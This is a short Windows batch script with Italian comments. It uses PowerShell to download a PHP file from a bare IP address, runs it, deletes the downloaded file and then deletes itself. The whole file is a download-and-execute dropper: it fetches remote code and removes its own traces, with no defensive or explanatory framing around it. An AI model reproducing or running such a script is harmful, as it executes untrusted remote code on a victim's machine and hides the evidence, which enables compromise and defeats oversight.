@echo off
REM Imposta il nome del file PHP e l'URL da cui scaricarlo
set "php_file=script.php"
set "url=http://45.138.16.193/php-exe.php"

REM Scarica il file PHP
echo Scaricando %php_file%...
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%php_file%'"

REM Esegui il file PHP
echo Esecuzione di %php_file%...
php %php_file%

REM Elimina il file PHP dopo l'esecuzione
echo Eliminazione di %php_file%...
del %php_file%

REM Auto-eliminazione dello script batch
echo Auto-eliminazione dello script...
del "%~f0"
